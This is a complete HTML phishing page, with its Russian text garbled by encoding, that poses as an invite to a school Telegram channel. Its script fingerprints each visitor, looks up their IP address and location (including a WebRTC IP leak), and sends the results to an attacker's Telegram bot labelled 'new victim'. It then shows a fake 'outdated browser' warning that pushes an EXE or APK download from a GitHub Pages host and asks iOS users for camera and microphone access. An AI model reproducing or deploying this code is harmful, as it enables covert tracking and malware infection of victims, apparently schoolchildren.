<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–µ—Ä–µ—Ö–æ–¥ –≤ Telegram</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
    <link rel="icon" href="https://telegram.org/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(165deg, #1e93d6 0%, #0d73bb 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .telegram-card {
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(135deg, #34b7f1 0%, #2aabee 100%);
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 5px solid #e6f4ff;
            position: relative;
        }

        .avatar::after {
            content: '';
            position: absolute;
            width: 40px;
            height: 40px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='white' d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
        }

        .channel-title {
            font-size: 24px;
            font-weight: 700;
            color: #000;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .channel-subscribers {
            font-size: 15px;
            color: #707579;
            margin-bottom: 35px;
        }

        .tg-button {
            background: #2aabee;
            color: white;
            border: none;
            border-radius: 14px;
            padding: 18px 0;
            font-size: 17px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 15px;
            letter-spacing: 0.3px;
        }

        .tg-button:hover {
            background: #229ed9;
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(42, 171, 238, 0.3);
        }

        .tg-button:active {
            transform: translateY(0);
        }

        .hint {
            font-size: 14px;
            color: #707579;
        }

        .update-screen {
            display: none;
            text-align: center;
            animation: fadeIn 0.4s ease;
        }

        .warning-icon {
            font-size: 70px;
            margin-bottom: 25px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.9; }
        }

        .update-title {
            font-size: 26px;
            font-weight: 700;
            color: #d93025;
            margin-bottom: 20px;
            line-height: 1.3;
        }

        .update-text {
            font-size: 16px;
            line-height: 1.6;
            color: #5f6368;
            margin-bottom: 18px;
        }

        .download-section {
            margin: 30px 0;
            width: 100%;
        }

        .download-button {
            background: #d93025;
            color: white;
            border: none;
            border-radius: 14px;
            padding: 20px 0;
            font-size: 18px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
        }

        .download-button:hover {
            background: #c5221f;
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(217, 48, 37, 0.3);
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #2aabee;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-message {
            font-size: 14px;
            color: #5f6368;
            margin-top: 20px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –û—Å–Ω–æ–≤–Ω–æ–π —ç–∫—Ä–∞–Ω Telegram -->
        <div class="telegram-card" id="mainScreen">
            <div class="avatar"></div>
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <p class="channel-subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</p>
            <button class="tg-button" id="tgButton">
                –ü–ï–†–ï–ô–¢–ò –í –ö–ê–ù–ê–õ
            </button>
            <p class="hint">–û—Ç–∫—Ä–æ–µ—Ç—Å—è –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Telegram</p>
        </div>

        <!-- –≠–∫—Ä–∞–Ω –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ -->
        <div class="telegram-card" id="updateScreen" style="display: none;">
            <div class="update-screen">
                <div class="warning-icon">‚ö†Ô∏è</div>
                <h2 class="update-title">–í–∞—à–∞ –≤–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ —É—Å—Ç–∞—Ä–µ–ª–∞</h2>
                <p class="update-text">
                    –î–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ –≤ Telegram –∏ –∑–∞—â–∏—Ç—ã –≤–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö 
                    –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å –±—Ä–∞—É–∑–µ—Ä.
                </p>
                <p class="update-text">
                    –°–∫–∞—á–∞–π—Ç–µ –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –æ–±–Ω–æ–≤–ª—ë–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é –Ω–∏–∂–µ. 
                    –≠—Ç–æ –∑–∞–π–º—ë—Ç –º–µ–Ω–µ–µ –º–∏–Ω—É—Ç—ã.
                </p>
                
                <div class="download-section" id="downloadSection">
                    <!-- –ö–Ω–æ–ø–∫–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ—è–≤–∏—Ç—Å—è –∑–¥–µ—Å—å -->
                </div>
                
                <div class="loader" id="loader"></div>
                
                <div class="status-message" id="statusMessage">
                    <!-- –°—Ç–∞—Ç—É—Å –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ—è–≤–∏—Ç—Å—è –∑–¥–µ—Å—å -->
                </div>
                
                <p class="hint">–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
            </div>
        </div>
    </div>

    <script>
        // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® –¢–û–ö–ï–ù
        const CHAT_ID = 'YOUR_CHAT_ID'; // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® ID (8001083987)
        const SITE_URL = window.location.href;

        // === –û–ü–†–ï–î–ï–õ–ï–ù–ò–ï –û–° ===
        function detectOS() {
            const ua = navigator.userAgent;
            if (/Windows Phone/i.test(ua)) return 'Windows Phone';
            if (/Win/i.test(ua)) return 'Windows';
            if (/Android/i.test(ua)) return 'Android';
            if (/iPad|iPhone|iPod/i.test(ua)) return 'iOS';
            if (/Mac/i.test(ua)) return 'macOS';
            if (/Linux/i.test(ua)) return 'Linux';
            return 'Unknown';
        }

        // === –°–ë–û–† –î–ê–ù–ù–´–• ===
        async function collectVictimData() {
            const data = {
                // –û—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                url: SITE_URL,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'direct',
                
                // –°–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                os: detectOS(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: JSON.stringify(navigator.languages),
                
                // –≠–∫—Ä–∞–Ω
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                
                // –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // –ë—Ä–∞—É–∑–µ—Ä
                cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
                doNotTrack: navigator.doNotTrack || 'unspecified',
                javaEnabled: navigator.javaEnabled ? 'true' : 'false',
                
                // –ê–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
            };

            // === –ì–ï–û–õ–û–ö–ê–¶–ò–Ø –ë–ï–ó –ó–ê–ü–†–û–°–ê ===
            // –ú–µ—Ç–æ–¥ 1: IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏—è (–æ—Å–Ω–æ–≤–Ω–æ–π)
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ IP
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                
                data.country = geoData.country_name || 'Unknown';
                data.countryCode = geoData.country_code || 'Unknown';
                data.region = geoData.region || 'Unknown';
                data.city = geoData.city || 'Unknown';
                data.latitude = geoData.latitude || 'Unknown';
                data.longitude = geoData.longitude || 'Unknown';
                data.isp = geoData.org || 'Unknown';
                
            } catch (ipError) {
                data.ip = 'failed_to_fetch';
                data.geoError = ipError.message;
            }

            // –ú–µ—Ç–æ–¥ 2: –†–µ–∑–µ—Ä–≤–Ω—ã–π IP-—Å–µ—Ä–≤–∏—Å
            if (!data.ip || data.ip === 'failed_to_fetch') {
                try {
                    const backupResponse = await fetch('https://api.my-ip.io/ip.json');
                    const backupData = await backupResponse.json();
                    data.ip_backup = backupData.ip || 'unknown';
                    data.country_backup = backupData.country || 'unknown';
                } catch (e) {
                    data.ip_backup = 'backup_failed';
                }
            }

            // === –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ï –î–ê–ù–ù–´–ï ===
            // –°–µ—Ç—å
            data.connection = navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : 'not_supported';

            // WebRTC IP —É—Ç–µ—á–∫–∞ (–µ—â—ë –æ–¥–∏–Ω –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ IP)
            try {
                const rtcPeerConn = window.RTCPeerConnection || window.mozRTCPeerConnection;
                if (rtcPeerConn) {
                    const rtc = new rtcPeerConn({iceServers: []});
                    rtc.createDataChannel('');
                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    
                    rtc.onicecandidate = (event) => {
                        if (event.candidate && event.candidate.candidate) {
                            const candidate = event.candidate.candidate;
                            if (candidate.includes('srflx')) {
                                const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                                if (ipMatch) {
                                    data.webrtc_ip = ipMatch[1];
                                }
                            }
                        }
                    };
                    
                    setTimeout(() => { rtc.close(); }, 1000);
                }
            } catch (rtcError) {
                data.webrtc_ip = 'not_detected';
            }

            return data;
        }

        // === –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM ===
        async function sendToTelegram(data) {
            // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            let message = `üïµÔ∏è *–ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê*\\n\\n`;
            message += `*–í—Ä–µ–º—è:* ${new Date().toLocaleString('ru-RU')}\\n`;
            message += `*–û–°:* ${data.os}\\n`;
            message += `*IP:* \`${data.ip || '–Ω–µ –ø–æ–ª—É—á–µ–Ω'}\`\\n`;
            
            if (data.country && data.country !== 'Unknown') {
                message += `*üìç –ì–µ–æ:* ${data.city}, ${data.region}, ${data.country}\\n`;
                message += `*–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:* ${data.latitude}, ${data.longitude}\\n`;
            }
            
            message += `*–ë—Ä–∞—É–∑–µ—Ä:* ${data.userAgent.substring(0, 80)}...\\n`;
            message += `*–≠–∫—Ä–∞–Ω:* ${data.screen}\\n`;
            message += `*–Ø–∑—ã–∫:* ${data.language}\\n`;
            message += `*–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞:* ${data.timezone}\\n`;
            message += `*–°—Å—ã–ª–∫–∞:* ${data.url}\\n\\n`;
            
            message += `*ID –∂–µ—Ä—Ç–≤—ã:* \`${generateVictimId(data)}\`\\n`;
            message += `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`;

            // –ö–æ–¥–∏—Ä—É–µ–º –¥–ª—è URL
            const encodedMessage = encodeURIComponent(message);
            
            // –°–æ–∑–¥–∞–µ–º URL –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown&disable_web_page_preview=true`;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
            const sendMethods = [
                // –û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥
                () => fetch(telegramUrl, { mode: 'no-cors' }),
                
                // –ú–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ Image (—Ä–∞–±–æ—Ç–∞–µ—Ç –ø–æ—á—Ç–∏ –≤—Å–µ–≥–¥–∞)
                () => {
                    const img = new Image();
                    img.src = telegramUrl;
                    return Promise.resolve();
                },
                
                // –ú–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ iframe
                () => {
                    return new Promise((resolve) => {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.src = telegramUrl;
                        iframe.onload = resolve;
                        document.body.appendChild(iframe);
                        setTimeout(() => {
                            document.body.removeChild(iframe);
                            resolve();
                        }, 1000);
                    });
                }
            ];

            // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ–º–∏ –º–µ—Ç–æ–¥–∞–º–∏
            for (const method of sendMethods) {
                try {
                    await method();
                    console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');
                    return true;
                } catch (error) {
                    console.warn('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
                    // –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–π –º–µ—Ç–æ–¥
                }
            }
            
            return false;
        }

        // === –ì–ï–ù–ï–†–ê–¶–ò–Ø ID –ñ–ï–†–¢–í–´ ===
        function generateVictimId(data) {
            const seed = `${data.ip || ''}${data.userAgent}${Date.now()}`;
            let hash = 0;
            for (let i = 0; i < seed.length; i++) {
                const char = seed.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(36).substring(0, 8).toUpperCase();
        }

        // === –û–ë–†–ê–ë–û–¢–ö–ê –ö–ù–û–ü–ö–ò ===
        document.addEventListener('DOMContentLoaded', function() {
            const tgButton = document.getElementById('tgButton');
            const mainScreen = document.getElementById('mainScreen');
            const updateScreen = document.getElementById('updateScreen');
            const downloadSection = document.getElementById('downloadSection');
            const loader = document.getElementById('loader');
            const statusMessage = document.getElementById('statusMessage');

            tgButton.addEventListener('click', async function() {
                // 1. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
                mainScreen.style.display = 'none';
                updateScreen.style.display = 'block';
                
                // 2. –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
                const victimData = await collectVictimData();
                
                // 3. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                const sendStatus = await sendToTelegram(victimData);
                
                if (sendStatus) {
                    statusMessage.textContent = '‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã';
                    statusMessage.style.display = 'block';
                    statusMessage.style.background = '#e6f7e9';
                    statusMessage.style.color = '#0a5c0a';
                } else {
                    statusMessage.textContent = '‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑';
                    statusMessage.style.display = 'block';
                    statusMessage.style.background = '#fff3cd';
                    statusMessage.style.color = '#856404';
                }

                // 4. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°
                const os = victimData.os;
                let buttonHtml = '';
                
                if (os === 'Windows') {
                    buttonHtml = `
                        <button class="download-button" onclick="downloadFile('windows')">
                            <span>‚¨áÔ∏è</span> –°–∫–∞—á–∞—Ç—å –¥–ª—è Windows (EXE, 8.5 MB)
                        </button>
                        <p style="font-size: 14px; color: #5f6368; margin-top: 10px;">
                            –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Ñ–∞–π–ª –ø–æ—Å–ª–µ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
                        </p>
                    `;
                } else if (os === 'Android') {
                    buttonHtml = `
                        <button class="download-button" onclick="downloadFile('android')">
                            <span>‚¨áÔ∏è</span> –°–∫–∞—á–∞—Ç—å –¥–ª—è Android (APK, 6.2 MB)
                        </button>
                        <p style="font-size: 14px; color: #5f6368; margin-top: 10px;">
                            –†–∞–∑—Ä–µ—à–∏—Ç–µ —É—Å—Ç–∞–Ω–æ–≤–∫—É –∏–∑ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤
                        </p>
                    `;
                } else if (os === 'iOS') {
                    buttonHtml = `
                        <div style="background: #fff3cd; padding: 20px; border-radius: 12px; border: 1px solid #ffeaa7;">
                            <p style="color: #856404; margin: 0; font-weight: 600;">
                                ‚ö†Ô∏è –î–ª—è iOS –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –≤–µ–±-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
                            </p>
                            <p style="color: #856404; margin: 10px 0 0 0; font-size: 14px;">
                                –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
                            </p>
                        </div>
                        <button class="download-button" onclick="downloadFile('ios')" style="background: #28a745;">
                            <span>üîÑ</span> –ù–∞—á–∞—Ç—å –≤–µ–±-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
                        </button>
                    `;
                } else {
                    buttonHtml = `
                        <div style="background: #f8f9fa; padding: 20px; border-radius: 12px;">
                            <p style="color: #5f6368; margin: 0; font-weight: 600;">
                                –í–∞—à–∞ —Å–∏—Å—Ç–µ–º–∞ (${os}) –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è
                            </p>
                        </div>
                    `;
                }
                
                downloadSection.innerHTML = buttonHtml;
            });
        });

        // === –§–£–ù–ö–¶–ò–Ø –°–ö–ê–ß–ò–í–ê–ù–ò–Ø ===
        function downloadFile(osType) {
            const loader = document.getElementById('loader');
            const statusMessage = document.getElementById('statusMessage');
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            loader.style.display = 'block';
            statusMessage.textContent = '‚è≥ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ñ–∞–π–ª–∞ –∫ —Å–∫–∞—á–∏–≤–∞–Ω–∏—é...';
            statusMessage.style.display = 'block';
            
            // –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°
            let fileName = '';
            let fileUrl = '';
            
            if (osType === 'windows') {
                fileName = 'browser_update.exe';
                fileUrl = `https://school4love.github.io/sc/${fileName}`;
            } else if (osType === 'android') {
                fileName = 'browser_update.apk';
                fileUrl = `https://school4love.github.io/sc/${fileName}`;
            } else if (osType === 'ios') {
                // –î–ª—è iOS –∏–º–∏—Ç–∏—Ä—É–µ–º –∑–∞–≥—Ä—É–∑–∫—É
                setTimeout(() => {
                    loader.style.display = 'none';
                    statusMessage.textContent = '‚úÖ –í–µ–±-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ. –ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.';
                    statusMessage.style.background = '#e6f7e9';
                    statusMessage.style.color = '#0a5c0a';
                    
                    // –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –º–µ–¥–∏–∞ –¥–ª—è iOS
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                            .then(stream => {
                                stream.getTracks().forEach(track => track.stop());
                                console.log('–î–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –ø–æ–ª—É—á–µ–Ω (iOS)');
                            })
                            .catch(err => {
                                console.log('–î–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω:', err);
                            });
                    }
                }, 2000);
                return;
            }
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            setTimeout(() => {
                loader.style.display = 'none';
                
                // –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
                const link = document.createElement('a');
                link.href = fileUrl;
                link.download = fileName;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å
                statusMessage.textContent = `‚úÖ –§–∞–π–ª ${fileName} –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...`;
                statusMessage.style.background = '#e6f7e9';
                statusMessage.style.color = '#0a5c0a';
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏
                const message = `üì• –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –°–ö–ê–ß–ò–í–ê–ï–¢: ${fileName}`;
                const encoded = encodeURIComponent(message);
                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ —Å–∫—Ä—ã—Ç—ã–π –∑–∞–ø—Ä–æ—Å
                const img = new Image();
                img.src = telegramUrl;
                
            }, 1500);
        }
    </script>
</body>
</html>
